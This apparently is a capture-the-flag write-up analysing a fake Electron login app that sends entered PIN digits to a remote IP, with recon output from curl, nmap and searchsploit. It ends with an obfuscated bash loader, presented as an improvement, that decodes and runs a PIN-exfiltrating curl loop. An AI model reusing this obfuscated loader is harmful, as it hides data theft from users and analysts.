Using ls verbose recursively listing we can figure out the directory structure

```assembly
┌─[root@Rebe11ion]─[~/Downloads/electron-tutorial-app-linux-x64]
└──╼ #ls -lahR
.:
total 121M
drwxr-xr-x 4 root root 4.0K Sep  3 17:04 .
drwxr-xr-x 3 root root  12K Sep  4 18:52 ..
-rw-r--r-- 1 root root  27K Sep  3 17:04 blink_image_resources_200_percent.pak
-rw-r--r-- 1 root root   15 Sep  3 17:04 content_resources_200_percent.pak
-rw-r--r-- 1 root root 8.4M Sep  3 17:04 content_shell.pak
-rwxr-xr-x 1 root root  78M Sep  3 17:04 electron-tutorial-app
-rw-r--r-- 1 root root 9.8M Sep  3 17:04 icudtl.dat
-rwxr-xr-x 1 root root 2.7M Sep  3 17:04 libffmpeg.so
-rwxr-xr-x 1 root root  19M Sep  3 17:04 libnode.so
-rw-r--r-- 1 root root 1.1K Sep  3 17:04 LICENSE
-rw-r--r-- 1 root root 1.8M Sep  3 17:04 LICENSES.chromium.html
drwxr-xr-x 2 root root 4.0K Sep  3 17:04 locales
-rw-r--r-- 1 root root 217K Sep  3 17:04 natives_blob.bin
-rw-r--r-- 1 root root 161K Sep  3 17:04 pdf_viewer_resources.pak
drwxr-xr-x 2 root root 4.0K Sep  3 17:04 resources
-rw-r--r-- 1 root root 1.5M Sep  3 17:04 snapshot_blob.bin
-rw-r--r-- 1 root root 149K Sep  3 17:04 ui_resources_200_percent.pak
-rw-r--r-- 1 root root    6 Sep  3 17:04 version
-rw-r--r-- 1 root root  57K Sep  3 17:04 views_resources_200_percent.pak

./locales:
total 360K
drwxr-xr-x 2 root root 4.0K Sep  3 17:04 .
drwxr-xr-x 4 root root 4.0K Sep  3 17:04 ..
-rw-r--r-- 1 root root 6.0K Sep  3 17:04 am.pak
-rw-r--r-- 1 root root 5.5K Sep  3 17:04 ar.pak
-rw-r--r-- 1 root root 6.5K Sep  3 17:04 bg.pak
-rw-r--r-- 1 root root 8.5K Sep  3 17:04 bn.pak
-rw-r--r-- 1 root root 4.0K Sep  3 17:04 ca.pak
-rw-r--r-- 1 root root 3.9K Sep  3 17:04 cs.pak
-rw-r--r-- 1 root root 3.6K Sep  3 17:04 da.pak
-rw-r--r-- 1 root root 4.0K Sep  3 17:04 de.pak
-rw-r--r-- 1 root root 7.1K Sep  3 17:04 el.pak
-rw-r--r-- 1 root root 3.4K Sep  3 17:04 en-GB.pak
-rw-r--r-- 1 root root 3.4K Sep  3 17:04 en-US.pak
-rw-r--r-- 1 root root 4.1K Sep  3 17:04 es-419.pak
-rw-r--r-- 1 root root 4.2K Sep  3 17:04 es.pak
-rw-r--r-- 1 root root 3.7K Sep  3 17:04 et.pak
-rw-r--r-- 1 root root 5.9K Sep  3 17:04 fake-bidi.pak
-rw-r--r-- 1 root root 5.6K Sep  3 17:04 fa.pak
-rw-r--r-- 1 root root 4.2K Sep  3 17:04 fil.pak
-rw-r--r-- 1 root root 3.7K Sep  3 17:04 fi.pak
-rw-r--r-- 1 root root 4.4K Sep  3 17:04 fr.pak
-rw-r--r-- 1 root root 8.2K Sep  3 17:04 gu.pak
-rw-r--r-- 1 root root 4.4K Sep  3 17:04 he.pak
-rw-r--r-- 1 root root 7.7K Sep  3 17:04 hi.pak
-rw-r--r-- 1 root root 3.8K Sep  3 17:04 hr.pak
-rw-r--r-- 1 root root 4.4K Sep  3 17:04 hu.pak
-rw-r--r-- 1 root root 3.5K Sep  3 17:04 id.pak
-rw-r--r-- 1 root root 4.0K Sep  3 17:04 it.pak
-rw-r--r-- 1 root root 4.8K Sep  3 17:04 ja.pak
-rw-r--r-- 1 root root 9.2K Sep  3 17:04 kn.pak
-rw-r--r-- 1 root root 3.8K Sep  3 17:04 ko.pak
-rw-r--r-- 1 root root 4.0K Sep  3 17:04 lt.pak
-rw-r--r-- 1 root root 4.2K Sep  3 17:04 lv.pak
-rw-r--r-- 1 root root  11K Sep  3 17:04 ml.pak
-rw-r--r-- 1 root root 7.9K Sep  3 17:04 mr.pak
-rw-r--r-- 1 root root 3.7K Sep  3 17:04 ms.pak
-rw-r--r-- 1 root root 3.5K Sep  3 17:04 nb.pak
-rw-r--r-- 1 root root 3.7K Sep  3 17:04 nl.pak
-rw-r--r-- 1 root root 3.9K Sep  3 17:04 pl.pak
-rw-r--r-- 1 root root 3.9K Sep  3 17:04 pt-BR.pak
-rw-r--r-- 1 root root 3.9K Sep  3 17:04 pt-PT.pak
-rw-r--r-- 1 root root 4.2K Sep  3 17:04 ro.pak
-rw-r--r-- 1 root root 6.1K Sep  3 17:04 ru.pak
-rw-r--r-- 1 root root 4.0K Sep  3 17:04 sk.pak
-rw-r--r-- 1 root root 3.8K Sep  3 17:04 sl.pak
-rw-r--r-- 1 root root 6.0K Sep  3 17:04 sr.pak
-rw-r--r-- 1 root root 3.4K Sep  3 17:04 sv.pak
-rw-r--r-- 1 root root 3.9K Sep  3 17:04 sw.pak
-rw-r--r-- 1 root root  11K Sep  3 17:04 ta.pak
-rw-r--r-- 1 root root 9.7K Sep  3 17:04 te.pak
-rw-r--r-- 1 root root 7.5K Sep  3 17:04 th.pak
-rw-r--r-- 1 root root 3.8K Sep  3 17:04 tr.pak
-rw-r--r-- 1 root root 6.3K Sep  3 17:04 uk.pak
-rw-r--r-- 1 root root 4.6K Sep  3 17:04 vi.pak
-rw-r--r-- 1 root root 3.4K Sep  3 17:04 zh-CN.pak
-rw-r--r-- 1 root root 3.4K Sep  3 17:04 zh-TW.pak

./resources:
total 3.4M
drwxr-xr-x 2 root root 4.0K Sep  3 17:04 .
drwxr-xr-x 4 root root 4.0K Sep  3 17:04 ..
-rw-r--r-- 1 root root 3.2M Sep  3 17:04 app.asar
-rw-r--r-- 1 root root 251K Sep  3 17:04 electron.asar
```

Using `md5sum` we can ensure the integrity of the binary files and focus on the resources we've got

![md5sum](https://user-images.githubusercontent.com/22657154/45045997-1e406900-b075-11e8-9886-254fe4e42855.png)

After extracting ```app.asar``` and ```electron.asar``` using ```asar``` command

```assembly
┌─[root@Rebe11ion]─[~/Downloads/electron-tutorial-app-linux-x64/resources]
└──╼ #asar extract app.asar app
┌─[root@Rebe11ion]─[~/Downloads/electron-tutorial-app-linux-x64/resources]
└──╼ #asar extract electron.asar electron
┌─[root@Rebe11ion]─[~/Downloads/electron-tutorial-app-linux-x64/resources]
└──╼ #ls -lah app
total 1.5M
drwxr-xr-x 3 root root 4.0K Sep  4 19:16 .
drwxr-xr-x 4 root root 4.0K Sep  4 19:16 ..
-rw-r--r-- 1 root root 1.4M Sep  4 19:16 bg.jpg
-rw-r--r-- 1 root root   31 Sep  4 19:16 .gitignore
-rw-r--r-- 1 root root 1.7K Sep  4 19:16 index.html
-rw-r--r-- 1 root root 6.4K Sep  4 19:16 LICENSE.md
-rw-r--r-- 1 root root 1.8K Sep  4 19:16 main.js
drwxr-xr-x 4 root root 4.0K Sep  4 19:16 node_modules
-rw-r--r-- 1 root root  422 Sep  4 19:16 package.json
-rw-r--r-- 1 root root  66K Sep  4 19:16 package-lock.json
-rw-r--r-- 1 root root 2.3K Sep  4 19:16 README.md
-rw-r--r-- 1 root root  171 Sep  4 19:16 renderer.js
-rw-r--r-- 1 root root 2.1K Sep  4 19:16 style.css
┌─[root@Rebe11ion]─[~/Downloads/electron-tutorial-app-linux-x64/resources]
└──╼ #ls -lah electron
total 24K
drwxr-xr-x 6 root root 4.0K Sep  4 19:16 .
drwxr-xr-x 4 root root 4.0K Sep  4 19:16 ..
drwxr-xr-x 3 root root 4.0K Sep  4 19:16 browser
drwxr-xr-x 3 root root 4.0K Sep  4 19:16 common
drwxr-xr-x 5 root root 4.0K Sep  4 19:16 renderer
drwxr-xr-x 2 root root 4.0K Sep  4 19:16 worker
```
And after running the binary file beside opening ```app/index.html``` using any browser, beside the previous information we've got we can say that all we need to solve this challenge is located inside ```app``` directory.

![screenshot at 2018-09-04 19-30-30](https://user-images.githubusercontent.com/22657154/45047334-0e2a8880-b079-11e8-88c2-44c538364e17.png)

Since we are dealing with some sort of malicious application we must have some sort of communications between the attacker and its victim's machine, so i started looking for any useful IP addresses or Domain names 

```assembly
┌─[root@Rebe11ion]─[~/Downloads/electron-tutorial-app-linux-x64/resources/app]
└──╼ #grep -Ri "http" -w | cut -d "(" -f 2 | cut -d ")" -f 1 | grep "^http"
http://nodejs.org/
http://api.jquery.com/
http://babeljs.io/
http://browserify.org/
http://requirejs.org/docs/whyamd.html
http://142.93.106.129/0000    # 0
http://142.93.106.129/0001    # 1 
http://142.93.106.129/0010    # 2
http://142.93.106.129/0011    # 3 
http://142.93.106.129/0100    # 4 
http://142.93.106.129/0101    # 5 
http://142.93.106.129/0110    # 6 
http://142.93.106.129/0111    # 7
http://142.93.106.129/1000    # 8
http://142.93.106.129/1001    # 9 
https://git-scm.com
```

After visiting each binary encoded directory there was no real functionality just giving ```Ok``` as a static response for any GET type requests, we are not able to use any other methods like POST too.

```assembly
┌─[✗]─[root@Rebe11ion]─[~/Downloads/electron-tutorial-app-linux-x64/resources/app]
└──╼ #for i in $(cat index.html | grep "142.93.106.129" | cut -d "(" -f 2  | cut -d ")" -f 1) ; do echo -n "$i - " ; curl $i 2> /dev/null ; echo ; done
http://142.93.106.129/0000 - OK
http://142.93.106.129/0001 - OK
http://142.93.106.129/0010 - OK
http://142.93.106.129/0011 - OK
http://142.93.106.129/0100 - OK
http://142.93.106.129/0101 - OK
http://142.93.106.129/0110 - OK
http://142.93.106.129/0111 - OK
http://142.93.106.129/1000 - OK
http://142.93.106.129/1001 - OK
```

```assembly
┌─[root@Rebe11ion]─[~/Downloads/electron-tutorial-app-linux-x64/resources/app]
└──╼ #curl --data "test" http://142.93.106.129/0011
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Cannot POST /0011</pre>
</body>
</html>
```

Nothing interesting about the application itself too, just interacting with the previous URLs based on a given input from range 0-9 

![screenshot at 2018-09-04 19-52-31](https://user-images.githubusercontent.com/22657154/45048666-cdcd0980-b07c-11e8-880d-1410d1ca3744.png)


the same as the server, no special services or directories that could reveal any other informations

```assembly
┌─[✗]─[root@Rebe11ion]─[~/Downloads/electron-tutorial-app-linux-x64]
└──╼ #nmap -sS -p- -T4 142.93.106.129 

Not shown: 65533 filtered ports
PORT    STATE  SERVICE
80/tcp  open   http
443/tcp closed https
┌─[root@Rebe11ion]─[~/Downloads/electron-tutorial-app-linux-x64]
└──╼ #nmap -sS -p 80 -sV -T4 142.93.106.129 

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.10.3 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
┌─[root@Rebe11ion]─[~/Downloads/electron-tutorial-app-linux-x64]
└──╼ #searchsploit nginx 1.
------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                                                 |  Path
                                                                                                                               | (/usr/share/exploitdb/)
------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Nginx 0.7.0 < 0.7.61 / 0.6.0 < 0.6.38 / 0.5.0 < 0.5.37 / 0.4.0 < 0.4.14 - Denial of Service (PoC)                              | exploits/linux/dos/9901.txt
Nginx 1.1.17 - URI Processing SecURIty Bypass                                                                                  | exploits/multiple/remote/38846.txt
Nginx 1.3.9 < 1.4.0 - Chuncked Encoding Stack Buffer Overflow (Metasploit)                                                     | exploits/linux/remote/25775.rb
Nginx 1.3.9 < 1.4.0 - Denial of Service (PoC)                                                                                  | exploits/linux/dos/25499.py
Nginx 1.3.9/1.4.0 (x86) - Brute Force                                                                                          | exploits/linux_x86/remote/26737.pl
Nginx 1.4.0 (Generic Linux x64) - Remote Overflow                                                                              | exploits/linux_x86-64/remote/32277.txt
------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```

At this point we've answered two of three of the questions we should answer.

```assembly 
- Find out what is going on wrong with the downloaded app
- Write a writeup about the malicious functionality and how did you find about it

```
Short answer
```
the app is actually a fake login application interacting with a malicious web server reciving data from the attacker and giving the attacker some useful data included User-agent and IP that could be used in later attacks, nothing is really malicious but the behaviour itself is malicious and in real senarious this could be dangerous. 
```

for the last question or "task" i should say, we have to improve the work of the malicious script.

```assembly
- Bounce on improving the malicious script 
```

this kind of tasks aims to slow down the analyst and mostly based on obfuscation and encryption
so as an improvement i've wrote this bash equivalent script based on my own text obfuscation algorithm ```MDR1```.

```bash
#!/bin/bash

#!/bin/bash
c=("019?" "028?" "071?" "087?" "100?" "126?" "145?" "149?" "151?" "155?" "162?" "163?" "170?"
   "186?" "187?" "196?" "199?" "207?" "219?" "223?" "226?" "228?" "232?" "277?" "279?" "305?"
   "311?" "316?" "326?" "334?" "346?" "361?" "369?" "371?" "372?" "382?" "386?" "422?" "461?"
   "482?" "511?" "514?" "518?" "541?" "558?" "581?" "582?" "610?" "612?" "622?" "625?" "631?" "763?")

str="A B C D E F G H I J K L M N O P Q R S T U V ' W X Y Z a b c d e f g h i j k l m n o p q r s t u v w x y z"
num=('S@f' 'EPT' 'xRi' 'ZvZ' 'DLM' 'YOR' 'AeF' 'OhC' 'LwN' 'LGQ')
n=("a" "T" "c" "L" "e" "O" "J" "U" "X" "Q")
#enc='url="http://142.93.106.129"; input=("0000" "0001" "0010" "0011" "0100" "0101" "0110" "0111" "1000" "1001") ; while true; do echo "== ENTER PIN CODE TO LOGIN ==" ; read -p "pin : " pin ; for i in $(seq 0 9 ) ; do if [[ $pin =~ $i ]] ; then curl ${url}/${input[$i]} 2> /dev/null 1> /dev/null ; fi ; done ; done'
enc='JTa?OOX?eJT?="LUc?OXc?OXc?OTX?://Taa?TQJ?ccL?aXU?TJL?TUa?JcO?caU?LXc?.TJL?TeO?TQQ?LTT?JTc?LTT?.Taa?TQJ?ccL?cTQ?@LJQ?aTQ?LJT?TcJ?.Taa?TQJ?ccL?JcO?caU?LXc?TJL?TeO?TQQ?";!LXc?OTT?OTX?JTa?OXc?=("cTQ?@LJQ?cTQ?@LJQ?cTQ?@LJQ?cTQ?@LJQ?"!"cTQ?@LJQ?cTQ?@LJQ?cTQ?@LJQ?Taa?TQJ?ccL?"!"cTQ?@LJQ?cTQ?@LJQ?Taa?TQJ?ccL?cTQ?@LJQ?"!"cTQ?@LJQ?cTQ?@LJQ?Taa?TQJ?ccL?Taa?TQJ?ccL?"!"cTQ?@LJQ?Taa?TQJ?ccL?cTQ?@LJQ?cTQ?@LJQ?"!"cTQ?@LJQ?Taa?TQJ?ccL?cTQ?@LJQ?Taa?TQJ?ccL?"!"cTQ?@LJQ?Taa?TQJ?ccL?Taa?TQJ?ccL?cTQ?@LJQ?"!"cTQ?@LJQ?Taa?TQJ?ccL?Taa?TQJ?ccL?Taa?TQJ?ccL?"!"Taa?TQJ?ccL?cTQ?@LJQ?cTQ?@LJQ?cTQ?@LJQ?"!"Taa?TQJ?ccL?cTQ?@LJQ?cTQ?@LJQ?Taa?TQJ?ccL?")!;!Jcc?LUc?LXc?eJT?LJT?!OXc?OOX?JTa?LJT?;!LeJ?OTe?!LJT?LLe?LUc?OTe?!"==!Taa?TXJ?ccL?Taa?caU?!TQJ?TOT?TXJ?!aUT?TXU?aXU?Taa?!ccL?TXU?!TJL?TXU?TeO?TOT?TXJ?!=="!;!OOX?LJT?LTJ?LeJ?!-OTX?!"OTX?LXc?OTT?!:!"!OTX?LXc?OTT?!;!LJQ?OTe?OOX?!LXc?!LXc?OTT?!$(OXT?LJT?OeT?!cTQ?@LJQ?!TJL?TeO?TQQ?!)!;!LeJ?OTe?!LXc?LJQ?![[!$OTX?LXc?OTT?!=~!$LXc?!]]!;!OXc?LUc?LJT?OTT?!LLe?JTa?OOX?eJT?!${JTa?OOX?eJT?}/${LXc?OTT?OTX?JTa?OXc?[$LXc?]}!JcO?caU?LXc?>!/LeJ?LJT?JTc?/OTT?JTa?eJT?eJT?!Taa?TQJ?ccL?>!/LeJ?LJT?JTc?/OTT?JTa?eJT?eJT?!;!LJQ?LXc?!;!LeJ?OTe?OTT?LJT?!;!LeJ?OTe?OTT?LJT?++'

dec(){
  var="$1"
  var=$( echo $var | sed 's/!/ /g' | sed 's/;:/\n/g')
  for i in {0..9}; do
     binx=$( echo $var | sed "s/${n[$i]}/$i/g" )
     var=$binx
  done
  xx=0
  for i in $str; do
    char=$( echo $var | sed "s/${c[$xx]}/$i/g" | sed 's/210/a/g')
    var=$char
    let xx+=1
  done
  for i in {0..9}; do
     bb=$( echo $var | sed "s/${num[$i]}/$i/g" )
     var=$bb
  done
  var=$(echo $var | sed "s/++$//g" )
  bash -c "$var"
}

dec $enc
```
running the script 
```
┌─[root@Rebe11ion]─[~]
└──╼ #bash script.sh 
== ENTER PIN CODE TO LOGIN ==
pin : 1   
== ENTER PIN CODE TO LOGIN ==
pin : 123
== ENTER PIN CODE TO LOGIN ==
pin : 
```
